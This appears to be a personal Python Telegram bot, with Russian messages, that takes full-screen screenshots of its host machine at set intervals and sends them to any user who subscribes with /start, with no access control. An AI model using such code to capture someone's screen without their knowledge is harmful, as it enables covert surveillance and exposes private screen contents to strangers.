import telebot
import pyautogui
import _thread
import time
import cv2
from PIL import ImageGrab
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

token = ""

button1 = KeyboardButton('/help')
button2 = KeyboardButton('/start')
button3 = KeyboardButton('/stop')
kb = ReplyKeyboardMarkup(resize_keyboard=True).add(button1).add(button2).add(button3)
users_to_send = []
delay = 5


def print_time(threadName):
    count = 0

    # im2.save('file.png')
    while True:
        try:
            im2 = ImageGrab.grab(bbox=None)
            count = 0
            for uid in users_to_send:
                bot.send_photo(uid, im2, reply_markup=kb)
                count += 1
        except:
            try:
                for uid in users_to_send:
                    bot.send_message(uid,
                                     'Напишите другому боту, я похоже сдох.',
                                     reply_markup=kb)
            except:
                pass
        print(threadName, "\nOтправлены скрины, количество:", count)
        time.sleep(delay)
        im2.close()


try:
    _thread.start_new_thread(print_time, ("Поток отправки скриншотов",))
except:
    print("Error: unable to start thread")

bot = telebot.TeleBot(token)


@bot.message_handler(commands=['addMe', 'start'])
def send_welcome(message):
    try:
        if message.from_user.id not in users_to_send:
            users_to_send.append(message.from_user.id)
            bot.reply_to(message, "Добавил в список получателей!\nЧтобы не получать больше сообщения напишите /stop!",
                         reply_markup=kb)
        else:
            bot.reply_to(message, "Вы уже в списке получателей!\nЧтобы не получать больше сообщения напишите /stop!",
                         reply_markup=kb)
    except Exception:
        pass


@bot.message_handler(commands=['stop'])
def send_welcome(message):
    try:
        if message.from_user.id in users_to_send:
            users_to_send.remove(message.from_user.id)
            bot.reply_to(message, 'Удалил из списка получателей!\nЧтобы получать скрины напишите /start',
                         reply_markup=kb)
        else:
            bot.reply_to(message, 'Ошибка!\nЧтобы получать скрины напишите /start', reply_markup=kb)
    except Exception:
        pass


@bot.message_handler(commands=['delay'])
def send_welcome(message):
    global delay

    try:
        delay = int(message.text.replace('/delay', '').strip())
        bot.reply_to(message, f'Изменил перерыв между сообщениями на {delay} секунд!', reply_markup=kb)
    except Exception:
        bot.reply_to(message, f'Ошибка изменения delay!', reply_markup=kb)


@bot.message_handler(commands=['help'])
def send_welcome(message):
    try:
        bot.reply_to(message,
                     f'Вы зашли в меню помощи. Функции:\nДля подключения к рассылке скриншотов напишите\n/start\n\n'
                     f'Для отключения от рассылки напишите\n/stop\n\nДля изменения задержки между сообщениями напишите'
                     f'\n/delay 5\nгде 5 - время задержки между сообщениями', reply_markup=kb)
    except Exception:
        pass


@bot.message_handler()
def send_welcome(message):
    try:
        bot.reply_to(message, f'Команда не распознана. Напишите /help', reply_markup=kb)
    except Exception:
        pass


while True:
    try:
        bot.polling()
    except Exception:
        pass
